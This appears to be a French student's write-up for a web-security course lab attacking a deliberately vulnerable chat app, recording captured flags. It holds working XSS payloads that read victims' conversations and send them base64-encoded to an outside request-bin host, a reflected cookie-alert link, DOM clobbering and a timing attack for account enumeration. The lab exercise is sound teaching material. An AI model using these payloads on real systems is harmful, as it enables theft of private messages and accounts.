[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-24ddc0f5d75046c5622901739e7c5dd533143b0c8e959d652212380cedb1ea36.svg)](https://classroom.github.com/a/lG4Q4YCc)
# 7 Security

Énoncé [ici](https://web-classroom.github.io/labos/labo-7-security.html)

## Partie 1

### Flag 1

**Flag**:

```text
flag1:20100ac1b2c69805
```

**Exploit**: 

Utilisation d'un serveur recevant des requêtes pour récupérer l'ensemble des conversations de la cible.

``` 
<img src=/ onerror="fetch('/')
    .then(response => response.text())
    .then(text => {
        const splittedText = text.split(' ');

        const convIds = splittedText.filter(word => word.includes('openChat'));

        const encodedData = btoa(convIds.join(' '));

        fetch('https://eo3qviqpfqdhtac.m.pipedream.net/' + encodedData)
        })
"/>
```
Après il suffit de prendre la requête sur le serveur proxy et décoder de base64 à du texte lisible ce qui était mis avec l'URL.

En ayant les ids des conversations, on peut afficher dans notre chat le contenu de sa conversation.
Permet de récupérer flag 1 et flag 2, mais il y a une autre méthode utilisant aussi un serveur dans le point 2.

```
<img src=/ onerror="fetch('/conversation/3233a3ff298a93fa')
    .then(response => response.text())
    .then(data => {
    
        const params = new URLSearchParams({ message: data });

        // Posts the fetched data to another conversation endpoint
        fetch('/conversation/f0fba37ad3a1eefb', {
            method: 'post',
            body: params
        });
    })
"/>
```


----------------------



### Flag 2

**Flag**: 

```text
flag2:fe6a7fdcc3ad3bb6
```

**Exploit**: 

```
<img src=/ onerror="fetch('/').then(async resp =>{
    const toto = await resp.text();
    fetch('https://eo3qviqpfqdhtac.m.pipedream.net/' + btoa(toto));
});"/>
```

Après il suffit de prendre la requête sur le serveur proxy et décoder de base64 à du texte lisible ce qui était mis avec l'URL.

### Flag 3

**Flag**: 

```text
flag3:968d95a58901d695
```

**Exploit**: 


```
<img src="/" onerror="
    fetch('/conversation/3233a3ff298a93fa', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({textMessage: 'gimme the rest of the codes pls'})
    }).then(() => 
        fetch('/conversation/3233a3ff298a93fa').then(response => response.text())
    ).then(receivedText => {
        const textParts = receivedText.split(' ');
        const flagList = textParts.filter(part => part.startsWith('flag3'));
        return btoa(flagList.join(' '));
    }).then(encodedFlags => 
        fetch('https://eo3qviqpfqdhtac.m.pipedream.net/' + encodedFlags)
    );
"/>
```

Après il suffit de prendre la requête sur le serveur proxy et décoder de base64 à du texte lisible ce qui était mis avec l'URL.

## Partie 2

### Flag 4

**Flag**: 

```text
flag4:ffbabc8fea1b6c20
```

**Exploit**:

Pour cet exploit, il fallait se renommer en tant que `nextTimeout`. 
Comme vu en cours c'est une `variable injection`, en se renommant comme tel on va "créer/initialiser" une variable existante dans le code notre nom est dans l'id d'un des éléments html.
Donc la variable s'appelant `nextTimeout` dans le code JS de la page et cela va provoquer une erreur lors du calcul avec la date, ce qui fera crasher à chaque fois la personne.

### Flag 5

**Flag**:

```text
flag5:2fd52888058f5060
```

**Exploit**:

Cet exploit est possible à cause des messages trop verbeux envoyés par le serveur.
On pouvait envoyer un message vide à Elon Musk et le serveur nous renvoyait une erreur avec beaucoup trop d'informations, tel qu'un `conversationId` auquel on ne devrait pas avoir accès.
On récupérait ensuite ce `conversationId` et on le mettait dans l'url pour avoir accès à la conversation d'Elon Musk et ainsi récupérer le flag.

### Flag 6

- `michelle.obama`
- `hillary.clinton`
- `george.w.bush`
- `sam.altman`

**Exploit**:

Pour ce dernier exploit, on va réaliser une sorte de `timing attack` sur le serveur.
En effet lorsque la personne n'a pas de compte, le serveur met environ 600-800 ms pour répondre, alors que si la personne a un compte, le serveur met environ 1600-1800 ms pour répondre.
Il y a donc une différence significative d'une seconde entre les deux cas, ce qui nous permet de savoir si la personne a un compte ou non.

## Exploit Supplémentaire

Lien vers ChatsApp qui, lorsque l'on clique dessus, exécute `alert(document.cookie)` dans le browser, que l'on soit actuellement connecté ou non à ChatsApp :

```
http://ec2-13-53-245-111.eu-north-1.compute.amazonaws.com/login?error=<script>alert(document.cookie);</script>
```

## Correction des vulnérabilités
Si vous effectuez d'autres modifications que celles demandées, merci de les lister ici :

Je vous redirige vers le code.